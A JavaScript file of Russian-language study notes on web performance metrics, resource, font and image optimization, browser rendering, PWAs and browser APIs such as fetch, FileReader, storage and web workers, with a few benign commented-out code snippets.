/*
**
***
****
*****/
//?=============================================================================
//? /FCP/First Contentful Paint/
//? первый значимый контент отрендерен

//? FCP включает в себя время выгрузки с предыдущей страницы, время установки соединения, время перенаправления и время до первого байта (TTFB), которые могут быть значительными при измерении в полевых условиях и могут привести к различиям между полевыми и лабораторными измерениями.



//? Как улучшить
//?     TTFB


//?     всевозможные оптимизации по загрузке ресурсов
/*
**
***
****
*****/
//?=============================================================================
//? /TBT/Total blocking time/
// https://web.dev/articles/tbt?hl=en
//? длительность блокировки потока после FCP, когда на событие пользователя не было отклика
//? если задача длится более 50мс - поток заблокирован
/*
**
***
****
*****/
//?=============================================================================
//? /TTFB/Time to first bite/
// https://web.dev/articles/optimize-ttfb?hl=ru
//? сколько времени занимал весь процесс от ввода в адресную строку до первого байта
//? тут вся оптимизация на стороне сервера


//? TTFB — это сумма следующих фаз запроса:
//?     Время перенаправления
//?     Время запуска сервисного работника (если применимо)
//?     DNS-поиск
//?     Соединение и согласование TLS
//?     Запрос, вплоть до момента поступления первого байта ответа.



//? Как улучшить
//?     hosting хороший


//?     CDN


//?     кэшировать контент


//?     убрать перенаправления


//?     потоковый рендеринг - например в node.js можно сделать ssr и отдавать на фронт частями готовый html, чтобы не ждать весь рендер html


//?     serviceWorker - чтобы отдавал кэшированные данные
/*
**
***
****
*****/
//?=============================================================================
//? /CLS/Cumulative Layout Shift/
// https://web.dev/articles/optimize-cls?hl=ru
// https://blog.logrocket.com/jank-free-page-loading-with-media-aspect-ratios/ todo

//? неожиданный сдвиг макета, это не хорошо для UX
//? в основном не учитывается в течении 500мс, если сдвиг был по событию от пользователя, особенно если изменение было близко к событию



//?     изображения устанавливать с размером


//?     шрифты загружаемые из за которых скачет контент


//?     iframe устанавливать с размеров


//?     динамический контент делать так, чтобы он по максимому не смещал контент, хорошая практика вниз страницы добавлять


//?     без взаимодействий пользователя на вставлять контент


//?     анимации, появление контента который не участвует в костяке - анимировать через transform и свойства которые используют composite слой
//? также задание для контента размеров изначально - лишний раз не будет запускать перекомпоновку


//?     поменьше запускать reflow/repaint


// https://blog.logrocket.com/jank-free-page-loading-with-media-aspect-ratios/
// https://developer.mozilla.org/ru/docs/Learn/HTML/Multimedia_and_embedding/Responsive_images#Art_direction
//?     также задание для контента(img/video...) размеров изначально - лишний раз не будет запускать перекомпоновку
//? либо задаем height/width либо через позиционирование делаем и сразу бронируем место для контента
/*
**
***
****
*****/
//?=============================================================================
//? /LCP/Largest Contentful Paint/
// https://web.dev/articles/optimize-ttfb?hl=ru
// https://web.dev/articles/content-delivery-networks?hl=ru


//? Время загрузки самого большого контента на странице
//? в общем самый главный контент был отрендерен показывает
//? контент для пользователя отрендерен и стал виден глазу, учитываются много данных, например img/video/элементы с непрозрачностью и тд

//? примерно работает так
//? рендерится например текст - это самый большой контент
//? затем рендерится еще больший блок - это теперь самый большой контент
//? затем изображение - теперь это самый большой контент
//? если дальше блоки маленькие, то они не учитываются и задержка считается, когда изображение было загружено и показано пользователю
//? также при spa если рендерится что то большое в динамике - это тоже будет учитываться



//? Как улучшить

//?     получать ресурсы с CDN
//? CDN - промежуточные сервера, которые находятся ближке к пользователю и туда тупо быстрей послать запрос


// https://developer.chrome.com/docs/lighthouse/performance/font-display/?hl=ru
//?     убрать блокирующие рендеринг ресурсы
//?     css самый основной встроить в html, потому что чем больше файлов загружать - тем больше запросов/открытий соединения и тд
//? добавить media запросы на сам тэг, чтобы по требованию загрузить их
//?     тоже самое с js - в head - блокирует и тот который без async/defer аттрибутов - убрать нужно такое
//?     fonts - может блокировать - может нет


//?     загружать необходимые ресурсы для LCP сразу, через linl=preload/fetchpriority=high, тоже самое с img
//? то есть не стоит вешать lazy load на все изображения бездумно, тк если изображение на главной странице - его нужно загрузить сразу же


//?     сжатие изображений и всех зависимостей


//?     не загружать самые необходимые ресурсы по цепочке
//? то есть критический js/css необходимо сразу в бандл засунунь, а не import каждый файл отдельно, если это основной css


//?     загрузка по требованию, потому что /большой вес/анализировать браузеру большой объем кода/


//?     минимизация кода


//?     избегать первоначально длинных задач, тк для рендеринга нужен основной поток


//?     как можно больше отдать с сервера готового HTML
//? не будет браузер ждать js - пока он сам создаст html
//? поисковики лучше работать будут
//? зависимые стили и тд будут увидены анализаторами и загружены сразу


// https://bundlers.tooling.report/hashing/
//?     хэширование для кэширования)


//?     ssr - тк браузер будет сразу анализировать страницу и начинать загружать ресурсы


//?     не загрузать сразу слишком много всего, тк браузер не сможет приоритезировать много запросов


//?     TTFB улучшить это
/*
**
***
****
*****/
//?=============================================================================
// https://web.dev/articles/optimize-lcp?hl=ru
// https://gist.github.com/paulirish/5d52fb081b3570c81e3a#getting-box-metrics что вызывает /layout/reflow/
// https://www.youtube.com/watch?v=cmtfM4emG5k
//? /INP/FID/Interaction to Next Paint/
//? Задержка всех взаимодействий пользователя, то есть через сколько времени страница отреагирует на события. Меньше 200 считает хорошим результатом


//? Состоит из 3х вещей
//?     Input delay - задержка от действия пользователя до того как браузер начнет обрабатывать колбэк(надо стремиться к 0, но если цифра большая - значит поток был заблокирован во время действия пользователя)
//?     Processing duration - время обработки колбэка
//?     Presentation delay - если во время кобэка были изменены стили/позиционирование и тд, браузеру нужно пересчитать макет и отрисовать



//?     меньше вложенность html
//? влияет на память(прочесть про управление памятью в этом же файле)
//? перерисовки, в целом браузеру больше оптимизаций нужно сделать и больше проходок по дому
//? хорошим показателем является количество dom элементов до 1400(именно элементов а не текстовых нод и тд)
//? как раз spa хорошо тут себя показывают - но главное чтобы рендер и создание html не был большим


//?     меньше сложность селекторов
//? то же самое что и с html


//?     isInputPending - узнать, есть ли взаимодействия пользователя которые нужно отработать(не всегда работает как надо), ну и плюс, что может быть все равно большой таск выполняться, поэтому советуют просто вместо этого, дробить на более мелкие фукнции через await setTimeOut
//Partial caniuse


//?     abortController - прервать запрос/не нагружать сеть и не нагружать ненужными обработками ответов


//?     не блокировать поток
//? на ввод пользователя обрабатывать САМОЕ необходимое связанно с этим вводом, как что то второстепенное, можно засунуть в таймеры, чтобы не блокировать большими задачами событие
//? разбивать трудоемкие задачи не - не блокировать поток, если бьем задачи, нужно сохранить их очередь выполнения, можно сделать за счет await setTimeOut 0, и после каждой функции делать await
//? использовать сервер/воркеры для расчетов


//?     resizeObserver/raf/requestAnimationFrame колбэки выполняются прямо перед перерисовкой и в них должна быть максимально маленькая неблокирующая работа


//?     использовать анимацию канвас вместо svg, чтобы не блокировать движок, также можно на видеокарту кинуть css какой то, и не вызывать reflow/repaint через код


//?     js tasks -> (microTasks) -> resizeObserver/raf -> style -> layout/reflow -> paint/repaint -> composite
//? чтение/установка стилей/классов должна вызываться в raf
//? на чтение всегда операции нужно группировать и выполнять перед изменением классов/стилей и манипуляций с dom, потому что нам доступны предыдущие положения/стили предыдущего кадра


//?     очень много стилей/добавление классов - не важно, через css или js - вызывают пересчет стилей - делать это нужно аккуратно
//? также обратить внимание на сложность селекторов и тд, удалить неиспользуемые и можно в devtools посмотреть сколько элементов подходит под такой то селектор, использовать "общие" селекторы - плохо, тк на больше элементов влияет селектор


//?     не менять стили в цикле каком то и тд, чтобы не было вызовов типа установка -> перерисовка -> установка -> перерисовка -> установка -> перерисовка -> установка -> перерисовка ->    можно заменить на установка/установка/установка/установка -> перерисовка


//?     удалить неиспользуемый код
//? cmd shift p -> coverage -> проверить неиспользуемый код на сайте


//?     client-side-render - в целом лучше(это старые добрые сайты), тк браузер частями получает html большую страницу и частями ее анализирует, а в промежутки может быть исполнен js код
//? тоже самое примерно можно добиться с помощью SSR
//? но в целом минус spa что если мы создаем очень много html за раз - браузер может очень долго рендерить страницу


//?     webWorkers - не блокировать основной поток(comlink используют для более удобного апи)


//?     Scheduler - можно планировать таски приоритетные
//Partial caniuse
// https://developer.mozilla.org/en-US/docs/Web/API/Scheduler


//?     Анимации выносить на composite уровень


//?     Evaluate Script - уменьшение времени оценки скрипта
//?     Compile module/Evaluate module
//? тк js компилируется - нужно уменьшить время оценки, когда мы загружаем скрипт, браузер его перед выполнением оценивает
//? разбивать на чанки и лениво загружать, тк чем меньше скрипт тем меньше браузеру нужно его оценивать, но тут нужно помнить, что чем больше запросов паралелльных - тем медленнее скрипты будут загружаться на сайт
//? но нужно помнитьэффективность сжатия падает немного
//? также плюс чтобы загружать мелкие файлы - кэш, потому что если изменится хэщ в маленьком файле - проще загрузить маленький файл(браузер сравнивают хэш файлов)



//?     content-visibility - css свойство которое позволяет браузеру пока он не в поле зрения пользователя пропускать рендер
//? contain-intrinsic-size позволяет "резервировать" место под блок чтобы не было перекомпоновки при рендере, но она будет, если мы укажем условно высоту 2000px для элемента а после рендера она станет фактической в 400px, наш скролл прыгнет и станет меньше
//?     content - свойство позволяющее запретить влиять тэгу и дочерним тэгам на верстку родителей, то есть условно изменения ширины не будут перерисовывать всю страницу, а только данный изолированный тэг


//?     на мобилках touchStart/end вместо клика, тк на мобилках клик работает с задержкой
// https://developer.mozilla.org/en-US/docs/Web/CSS/content-visibility
// https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_containment/Using_CSS_containment
// https://developer.mozilla.org/en-US/docs/Web/CSS/contain-intrinsic-size
/*
**
***
****
*****/
//?=============================================================================
//? /Fonts/@font-face/


//?     шрифты встраивать сразу на страницу либо если со стороннего ресура - то предзагружать, чтобы не было скачков текста и тд, и явно сразу указывать что использует шрифт, потому что пока не будет использования шрифта - он загружен не будет, лучше получать с CDN


//?     local - сначала попытаться загрузить локально и только потом через сеть шрифт


//?     format/url - сначала проверить поддерживает ли формат такой и если что перейти к другому src


//?     загружать не весь шрифт со всеми глифами и тд, а только нужную жирность, тип и тд, чтобы точечно загружать отдельно шрифты


//?     font-display(swap) - разные стратегии рендеринга текста
// https://web.dev/articles/font-best-practices#choose_an_appropriate_font-display_strategy
// https://developer.mozilla.org/ru/docs/Web/CSS/@font-face/font-display


//?     preconnect шрифты, предварительно загруженные без атрибута crossorigin , будут загружены дважды!


//?     woff2 использовать


//?     unicode range сообщает браузеру, для каких символов можно использовать шрифт.


//?     system-ui
// https://web.dev/patterns/web-vitals-patterns/fonts/font-self-hosted?hl=en
// https://web.dev/articles/font-best-practices?hl=ru


//?     кэшировать в браузере шрифты, тк они не так часто меняются


//?     есть безопасные шрифты
// https://www.cssfontstack.com/
// https://en.wikipedia.org/wiki/Core_fonts_for_the_Web
/*
**
***
****
*****/
//?=============================================================================
//? /Images optimization/
// https://web.dev/explore/fast
//?     формат изображения, векторная или растровая
//? вектор - для иконок и логотипов, четкий и масшатабируемый
//? растровые - для сложных изображений, и для разных девайсов нужены разные картинки с разной плотностью пикселей

//?     видео вместо гифок - оно легче и лучше передает цвета

//?     самое высокое расширение - тогда PNG, но и размер больше чем у всех, возможно заменить на WebP

//?     svg - в большинстве для работы не нужны всякие метаданные, поэтому можно смело выпилиывать большую часть

//?     сжимать изображения автоматически
// https://web.dev/articles/use-imagemin-to-compress-images?hl=ru

//?     webp - вместо старых форматов по возможности
//? Меньший размер файлов
//? Поддержка прозрачности (альфа-канал)
//? Поддержка анимации
//? Быстрое декодирование в браузере
//? Улучшение производительности веб-страниц:

//?     picture/source - адаптивно загружать нужные изображения под устройство, именно РАЗНЫЕ изображения, в основном по форматам, проверить поддерживает ли браузер такой то формат
// https://developer.mozilla.org/ru/docs/Web/HTML/Element/source#attr-srcset
// https://developer.mozilla.org/en-US/docs/Web/Media/Formats

//?     img srcset - адаптивно подгружать разные изображения в зависимости от плотности пикселей, но можно это сделать и в source/picture, img используем если нам НЕ нужно загружать РАЗНЫЕ файлы по условию

//?     cdn

//?     lazyLoading
//? loading attribute/js реализация; можно проверить loading in HTMLImageElement.prototype есть или нет
//? но также этот аттрибуте не нужно ставить на изображения, которые сразу должны быть на странице - иначе загрузка начнется только после полного анализа всего DOM; если изображение скрыто, кроме display: none - загрузка будет осуществлена

//?     preload - предзагрузка контента

//?     video preload=metadata - чтобы предоставить пользователю данные о видео, и прослушать событие

//? если изображение загружается медленно, можно бэкграундом загрузить самое легкое изображение из всех возможных и обработать его для пользователя через опасити например, чтобы он видел, что загрузка происходит
/*
**
***
****
*****/
//?=============================================================================
//? /JS/

//?     noscript - если не поддерживает js - уведомить пользователя

//?     js tasks -> (microTasks) -> resizeObserver/raf -> style -> layout/reflow -> paint/repaint -> composite
//?     чтение/установка стилей/классов должна вызываться в raf
//? на чтение всегда операции нужно группировать и выполнять перед изменением классов/стилей и манипуляций с dom, потому что нам доступны предыдущие положения/стили предыдущего кадра - то есть читать мы можем без проблем - а установка будет вызывать перекомпановку

// https://gist.github.com/paulirish/5d52fb081b3570c81e3a#getting-box-metrics
//?     очень много стилей/добавление классов - не важно, через css или js - вызывают пересчет стилей - делать это нужно аккуратно

//?     не менять стили в цикле каком то и тд, чтобы не было вызовов типа установка -> перерисовка -> установка -> перерисовка -> установка -> перерисовка -> установка -> перерисовка ->    можно заменить на установка/установка/установка/установка -> перерисовка

//?     удалить неиспользуемый код/минимизация

//?     isInputPending - узнать, есть ли взаимодействия пользователя которые нужно отработать

//?     abortController - прервать запрос/не нагружать сеть и не нагружать ненужными обработками ответов

//?     не блокировать поток
//? на ввод пользователя обрабатывать САМОЕ необходимое связанно с этим вводом, как что то второстепенное, можно засунуть в таймеры, чтобы не блокировать большими задачами событие
//? разбивать трудоемкие задачи не - не блокировать поток, если бьем задачи, нужно сохранить их очередь выполнения
//? использовать сервер/воркеры для расчетов

//?     resizeObserver колбэки выполняются прямо перед перерисовкой и в них должна быть максимально маленькая неблокирующая работа
//?     raf - тоже самое

//?     nomodule

//?     использовать современный синтаксис
// https://web.dev/articles/publish-modern-javascript?hl=ru
//? старый формат до es6 медленнее примерно на 20% и больше в объеме
//? далеко не всегда это будет ощутимо, потому что современные браузеры - 95% людей используют, после преобразования наша целевая аудитория повысится до 98% - но стоит ли оно того?

//?     esModules
//? потому что es - это статический проект и там легче узнать зависимости. Tree shaking как раз работает лучше всего в es

//?     не выбирать сторонние ресурсы не соответсвующие данным требованиям
/*
**
***
****
*****/
//?=============================================================================
//? /Css/
// https://web.dev/explore/fast
//? блокируют рендер

//?     отложить некритичный css

//?     минимизация

//?     критический код вставить сразу на страницу, чтобы не ждать дополнительного соединения(но также тут минус, что не будет кэшироваться css)

//?     использовать background-image в media запросах, чтобы под устройства загружать разные размеры картинок
/*
**
***
****
*****/
//?=============================================================================
//? /Resources/
// https://web.dev/explore/fast

//?     cdn
//? кэширует
//? быстрее, не нужно постоянно соединение устанавливать

//?     приоритезация через rel - можно посмотреть во влкадке network priority
//? можно предзагружать, предустанавливать соединения для контента, а также префетчить страницы, на которые возможно будем переходить

//?     fonts preload - шрифты встраивать сразу на страницу либо если со стороннего ресура - то предзагружать, чтобы не было скачков текста и тд, и явно сразу указывать что использует шрифт, потому что пока не будет использования шрифта - он загружен не будет
//? шрифты, предварительно загруженные без атрибута crossorigin , будут загружены дважды!

//?     критический css сразу на страницу/либо preload

//?     video preload=metadata - чтобы предоставить пользователю данные о видео, и прослушать событие

//?     сколько будет подряд тэгов, которые загружаеют внешний ресурс - столько раз сделается запрос(если до этого они не были кэшированы), поэтому желательно не использовать сразу в одном месте несколько audio/new Audio/link и тд
/*
**
***
****
*****/
//?=============================================================================
//? Оптимизация UX/UI/паттерны
// https://web.dev/explore/learn-core-web-vitals

//?     placeholders - для загружаемого контента(изображения), устанавливать/резервировать место(плэйсхолдеры)

//?     autoScroolSlider - автопроигрывание не нужно использовать, тк думают что это реклама
// https://web.dev/articles/carousel-best-practices?hl=en

//?     устанавливать изначальные размеры для video/img/iframe
// https://developer.mozilla.org/ru/docs/Web/HTML/Element/video#attr-poster/
//? для video указывать poster - LCP будет ждать загрузки постера, а не всего видео, а так будет ждать загрузку первого кадра видео

//?     бесконечный скролл реализованный виртуально
// https://addyosmani.com/blog/infinite-scroll-without-layout-shifts/

//?     шрифты ниже оптимизация

//?     модальные окна/popup - информация не вызываем сдвиги макета и несет важную информацию

//?     использовать video instead gif - тк меньше сильно весят

//?     уведомления прибитые к низу

//?     picture тэг использовать

//?     noscript - если не поддерживает js - уведомить пользователя

//?     getBattery - если маленький заряд телефона и тд - обработать как то

//?     уведомления пользователя о сети, а также отключение скачивания контента и тд при плохом соединении
// https://web.dev/articles/adaptive-serving-based-on-network-quality
/*
**
***
****
*****/
//!=============================================================================
//? /SSR/
//? рендеринг на стороне сервера

//? основным недостатком SSR является то, что он требует дополнительного времени обработки сервера, что может замедлить работу вашего TTFB
/*
**
***
****
*****/
//!=============================================================================
//? /SSG/
//? рендеринг статичного html на этапе сборки, отличается от ssr тем, что на ssr в зависимости от js будет рендерится, а тут сразу, это лучше тк быстрее отдаваться на фронт будет, но такое не всегда возможно из за специфики приложений
/*
**
***
****
*****/
//!================================================================================================================================================
//? /Style/Reflow(/Layout/)/Repaint/Composite/
// https://rashidovr.medium.com/reflow-repaint-composite-%D1%87%D1%82%D0%BE-%D1%8D%D1%82%D0%BE-%D0%B8-%D0%BA%D0%B0%D0%BA-%D1%8D%D1%82%D0%BE-%D1%80%D0%B0%D0%B1%D0%BE%D1%82%D0%B0%D0%B5%D1%82-a777c5760295
// https://docs.google.com/spreadsheets/u/0/d/1Hvi0nu2wG3oQ51XRHtMv-A_ZlidnwUYwgQsPQUg1R2s/pub?single=true&gid=0&output=html
// https://gist.github.com/paulirish/5d52fb081b3570c81e3a

//? Reflow, Repaint запускаются в eventLoop, а это значит, что интерактивность может закончиться, если js выполняет слишком сложный код.


//? /RAF/RequestAnimationFrame/Animations/Анимации/
//? На этом этапе браузер готов к запуску рендера и мы подготавливаем кадр для шага анимации. Эти просчеты как раз выполняются перед рендером

//? Анимации js/css работают одинаково, если используют свойства которые вызывают /repaint/paint/reflow/ тк в eventLoop выполняются и те и те, но если анимации работают с composite уровнем(transform), тогда css будет быстрее тк на отдельном графическом процессоре будет выполняться



//? /Recalculate Style/Style/



//? Reflow/Layout
//? Эта задача в цикле высчитывает положение элементов, координаты, размеры и т.д., для элеменов display:none расчеты не будут сделаны.
//? Данная задача запускается после загрузки html и css, а также всегда, когда мы меняем через js положение элемента, или наоборот получаем его метрики, при скролле страницы.
//? Эта задача становится сложней, чем больше вложенность, чем больше css правил.



//? /Repaint/Paint/
//? Запускается сразу после layout, тут происходит окрашивание элементов, также это ресурсоемкая операция, которую как минимум вызывают манипуляции с цветом, задним фоном, и т.д.



//? /Composite/
//? Например will-change, transform, translate3d, filter, opacity выносят графику на композит задачу, поэтому такая плавная она и не блокируется js кодом.
//? Эта задача происходит в потоке композитора compositor thread(GPU - графический процессор). Тут происходит группировка страницы по слоям, растрирование слоев(отрисовка пикселей). В данном потоке также есть подзадачи, например браузер в приоритете отписовывает те элементы, что видны в данный момент в окне.
//? НО также надо помнить, что данный этап кушает память, поэтому каждый элемент не надо помечать will-change свойством, иначе память попросту закончится, или даже советуют добавлять через js и удалять после использования
/*
**
***
****
*****/
//!=============================================================================
//? /PWA/Progressive web applications/
// https://web.dev/learn/pwa
// https://web.dev/explore/progressive-web-apps
//? ведет себя как приложение, то есть может работать и офлайн, открываеся в новом окне браузера - а не на вкладке дополнительное, так пользователь чувствует это приложение приложением

//? Плюсы
//?     пользователи не любят медленный интернет
//?     50%+ не будут скачивать приложения для совершения заказа и тд
//?     качать приложение - много памяти скушает, а pwa - около 1мб будет
//?     статистика говорит, что pwa - крайне выгодно
// https://www.thinkwithgoogle.com/marketing-strategies/app-and-mobile/smartphone-mobile-app-and-site-purchase-data/
// https://www.pwastats.com/
//?     использовать полезно, чтобы предоставить информацию в офлайн режиме, не всю, а ту что доступна - например купленные билеты, и что то такое, что пользователь уже сделал и у него есть к этому доступ



//? как заставить пользователя подписаться и скачать приложения лучшие практики
//? лучшие практики уведомлений
// https://web.dev/articles/push-notifications-permissions-ux
/*
**
***
****
*****/
//?=============================================================================
//? отследить когда приложение может быть установлено и было установлено через события можно
//? beforeinstallprompt/appinstalled

//? чтобы приложение было устанавливаемым, нужно webmanifest, https

//? приложения можно настроить и установить и из магазина, нужено TWA, а также просто из браузера
/*
**
***
****
*****/
//? setAppBadge - для PWA указывает количество непрочитанных уведомлений
/*
**
***
****
*****/
//!=============================================================================
//? /View transition/
// https://developer.mozilla.org/en-US/docs/Web/API/View_Transitions_API#the_view_transition_process
//? Позволяет запустить анимацию для переходов, в этот момент поверх html будет создан shadow dom элемент, который закроет от действий со страницей пользователя, чтобы он не мог ни с чем взаимодействовать
/*
**
***
****
*****/
//!================================================================================================================================================
//? /Открытие окон/методы window/popup/
// https://learn.javascript.ru/popup-windows


//? window.open
//? открывает новое окно, третьим аргументом можно передать настройки этого окна, позицию и т.д., метод возвращает ссылку на новое окно, с которым можно взаимодействовать(но это только если у нас один и тот же источник, совпадают домен, протокол и порт)
//? в современных браузерах попапы блокируются, если он был открыт не по желанию пользователя(например, клик)


//? window.opener
//? к открывшему окну можно обратиться через это свойство, оно всегда равно null, кроме попапов


//? window.close
//? закрывает окно, но сейчас делают, что это возможно только, если это попап, т.е. открыто окно было через open


//? iframe
//? тоже самое и с другим окном встроенным в iframe, если у них разный домен и т.д. доступ к нему запрещен, если один и тот же, то мы можем изменять содержимое


//? window.frames
//? доступ ко всем фреймам страницы, можно получить по индексу или по имени


//? window.postMessage
//? позволяет отправить сообщение в другое окно(ограничения такие же)

//? event.message
//? позволяет отлавливать подобные сообщения из других окон, сработает, если метод отправки прошел все хорошо(защиту)










//!================================================================================================================================================
//*ПОТОМ ПРОЧЕСТЬ НА ПОТОМ
//? /Blob/
// https://learn.javascript.ru/blob


//? URL.createObjectURL
//? принимает обьект blob или file, и создает ссылку на этот обьект, которую можно потом использовать в src, например картинки
/*
let input = document.getElementById('file');
input.addEventListener('change', function () {
    const file = new Blob([this.files[0]], { type: this.files[0].type });
    const url = URL.createObjectURL(file);
    const img = document.createElement('img');
    img.src = url;
    document.body.append(img);
});
*/


//? URL.revokeObjectURL(url)
//? удаляет внутрненнюю ссылку на обьект, что позволяет его удалить сборщику мусора










//!================================================================================================================================================
//? /File/FileReader/
// https://learn.javascript.ru/file


//? file это обьект о файле, который доступен нам из инпута, либо при перетаскивании файла, наследуется от blob


//? filereader
//? обьект для преобразования blob и file в разные данные(текст, url, и т.д.), все эти действия такие как readAs<something>, занимают какое то время, поэтоу нужно на них ставить обработчики событий
/*
let input = document.getElementById('file');
input.addEventListener('change', function () {
    const inputFile = this.files[0];
    const reader = new FileReader();
    const img = document.createElement('img');
    reader.readAsDataURL(inputFile);
    reader.onload = function (e) {
        img.src = reader.result;
        document.body.append(img);
    }
});
*/










//!================================================================================================================================================
//? /Fetch/Сетевые запросы/
// https://learn.javascript.ru/fetch
// https://learn.javascript.ru/fetch-api        ***список настроек второго аргумента
// https://learn.javascript.ru/xmlhttprequest


//? поддерживается в современных браузерах, в страрых может понадобиться полифилл, а также фетч это обертка над старым добрым XMLHttpRequest
//? первым параметром принимает url, вторым всевозможные настройки запроса, возвращает запрос промис, и ответ, кстати, надо тоже обработать и преобразовать в нужный нам вариант(текстовый, json, blob и т.д)
//? также важный момент, что fetch запрос упадет(вернет ошибку) только когда нет интернета или нет такого сайта вообще, в остальных случаях ошибки не будет, поэтому мы можем проверить условием со свойством 'ok' или со 'status'


//? ok
//? свойство возвращает true, если статус в диапозоне 200-299, то это все круто и ответ пришел без ошибок


//? status
//? вернет код статуса запроса(404,500)


//? text, json, formData и т.д
//? методы преобразования ответа в соответствующие данные, все возвращают промис


//? чтобы запушить на сервер что нибудь, нужно передать в обьекте настроек body, и преобразовать его в нужный нам тип, а также установить 'Content-Type' в headers





//?================================================================================================================================================
//? /AbortController/
// https://developer.mozilla.org/ru/docs/Web/API/AbortController


//? служит для отмены запроса fetch, но плоховато пока что поддерживается
//? мы создаем контроллер и оттуда сигнал передаем в обьект настроек фетч, который будет слушать метод контроллера аборт и при его вызове наш запрос отменится, также можно слушать отмененное действие на сигнале
/*
const controller = new AbortController();
const signal = controller.signal;
signal.addEventListener('abort', (e) => {
    console.log('отменено', e);
});
fetch('https://jsonplaceholder.typicode.com/todos/1', {
    signal
})
    .then(res => {
        if (res.ok) {
            return res.json();
        }
    })
    .then(res => console.log(res))
    .catch(e => console.log(e));

controller.abort();
*/





//?================================================================================================================================================
//? /Url/
// https://learn.javascript.ru/url
// https://developer.mozilla.org/ru/docs/Web/API/URL/URL


//? конструктор для создания url путей, удобен, потому что внутри себя сразу есть возможность достать протокол, хэш, порт и т.д
//? но пока что не везде поддерживается





//?================================================================================================================================================
//? /Formdata/
// https://learn.javascript.ru/formdata


//? при создании обьекта мы как аргумент передаем форму, чтобы все поля формы сразу считались при создании, мы должны им всем задать аттрибут name, ВАЖНО! в консоли этот обькт почему то всегда пустой, поэтому проверить мы его не сможем)


//? можно добавлять дополнительно свои поля, удалять, получать и т.д.

//? append/set
//? 2 похожих метода, но append добавляет в этот обьект поля по имени, и имя может повторяться, а вот set сначала удалит все свойства с этим именем и потом запишет новое
//? чтобы добавить blob в формдату, нужно передать 3 аргумента, вместо двух, это ключ, сам blob, а также имя файла


//? при отправке на сервер такого обьекта headers тип контента установится автоматически
/*
**
***
****
*****/
//!================================================================================================================================================
//? /Cache/CacheApi/
// https://web.dev/articles/storage-for-the-web#check
//? нам доступно очень много места для кэша, около 80% диска на устройстве


// https://web.dev/articles/persistent-storage
// https://developer.mozilla.org/en-US/docs/Web/API/Navigator/storage
// https://docs.google.com/document/d/19QemRTdIxYaJ4gkHYf2WWBNPbpuZQDNMpUVf8dQxj4U/preview#heading=h.nij5cwyctzt0
//? если превысить квоту, indexedDb/CacheApi выдадут исключения QuotaExceededError
//? существуют постоянная и временная зона хранения данных
//? при превышении квоты, браузер будет удалять сначала кэш из наименее используемых источников из временной зоны хранения
//? из постоянной - только если пользователь сам очистит кэш в настройках браузера
//? navigator.storage - доступен только в https и там можно запросить сохранять все данные в постоянной зоне и если браузер разрешит, то CacheApi, cookie, localStorage, FileSystemApi, indexedDb, webWorkers будут сохранять кэш в постоянную зону
//? постоянную зону можно запросить, но пока что нельзя отключить и следует запрашивать ТОЛЬКО при критически важных данных, скорее всего вам хватит и временной зоны для сайта, браузеры редко когда удаляют данные даже из временной зоны
//? у сафари как всегда что то свое https://webkit.org/blog/10218/full-third-party-cookie-blocking-and-more/
/*
**
***
****
*****/
//?=============================================================================
//? /Sessionstotage/Localstorage/DomStorage/
//? около 5мб
//? только строки
//? никогда не отправится на сервер и может быть модифицировано только через js
//? синхронно работают
//? в incognito - оба сохраняют данные на время жизни вкладки
//? нет в webWorker/serviceWorker
/*
**
***
****
*****/
//?=============================================================================
//? Sessionstotage
// https://learn.javascript.ru/localstorage
//? хранилище текущей сессии
//? после закрытия вкладки и заново открыть - очищается
//? при восстановлении вкладки - сохранится, после перезагрузки
//? другая вкладка с той же страницей будет иметь собственное хранилище, но если страницы из одного источника и одна из них в iframe - то хранилище будет разделено
//? можно получить доступ через сторонний скрипт - не безопасно(можно получить ключ по индексу) и затем получить значение

//? не безопасно хранить данные
/*
**
***
****
*****/
//?=============================================================================
//? /Localstorage/
//? сохранит данные пока явно не удалить или не очистить хранилище браузера
//? storage window event - если один и тот же домен, но разные страницы, чтобы синхронизировать изменения
//? можно получить доступ через сторонний скрипт - не безопасно(можно получить ключ по индексу) и затем получить значение

//? не безопасно хранить данные
/*
**
***
****
*****/
//? /Cookie/
//? в разделе кук смотри инфу
/*
**
***
****
*****/
//?=============================================================================
//? /IndexedDb/База данных/
// https://learn.javascript.ru/indexeddb
// https://web.dev/articles/indexeddb-best-practices
// https://developer.mozilla.org/ru/docs/Web/API/IndexedDB_API
//? Локальная база данных, отдельная для каждого источника, порта.
//? желательно использовать обертку на промисах
//? можно хранить почти все, бывают проблемы с blob
//? исключения будут при отсутсвии памяти и инкогнитно режиме
//? доступны расширениям браузера!
//? запись синхронна и пихать слишком вложенные обьекты не надо, потому что браузеру необходимо сделать будет клон этого обьекта, то есть лучше всего хранить ключ=значение и все, и оно не должно быть большим
//? доступны в webWorker

//? не безопасно хранить данные
/*
**
***
****
*****/
//?=============================================================================
//? /CacheApi/
// https://web.dev/articles/cache-api-quick-guide#cacheaddall
// https://developer.mozilla.org/en-US/docs/Web/API/caches
//? хранить можно сотни гигов
//? можно кэшировать вообще все, но главное чтобы было в виде response/request обьектов изображения, видео, страницы, в общем файлы какие то, чтобы оффлайн можно было доступ иметь к ним
//? заголовки set-cookie не будут сохранены
//? https only
//? caches in window, тк не везде доступен
//? есть в webWorkers
//? браузер не будет перезапрашивать те ресурсы которые есть в кеше
/*
**
***
****
*****/
//!=============================================================================
//? /WebWorker/Dedicated/
// https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API
// https://html.spec.whatwg.org/multipage/workers.html#the-worker's-lifetime
//? запускать js файлы в отдельном потоке для сложных вычеслений

//? перед использованием лучше проверять widnow.Worker/SharedWorker
//? запускаются в другом контексте, нельзя манипулировать DOM, и не все фукнции доступны https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Functions_and_classes_available_to_workers, но самое главное, можно использовать indexedDb, webSockets и общие базовые классы
//? localStorage/sessionStorage нет
//? window нельзя обращаться, только self
//? postMessage - через него туда обратно
//? можно также динамически запускать других воркеров
//? importScripts - запускать скрипты
//? также удалять можно и нужно при неиспользовании
//? данные которые передаются - копируются(StructualClone), а не используются те же самые
//? передавать можно данные типа arrayBuffer
//? каждая вкладка - новый воркер
/*
**
***
****
*****/
//?=============================================================================
//? /SharedWorker/
// https://developer.mozilla.org/en-US/docs/Web/API/SharedWorker
//? несколько файлов могут обращаться к одному и тому же воркеру, если они работают в одном домене
//? в инкогнито не могут использовать это
//? port.postMessage - тут немного по другому
//? onconnect - когда произошел коннект и весь код должен быть тут
/*
**
***
****
*****/
//?=============================================================================
//? /ServiceWorker/
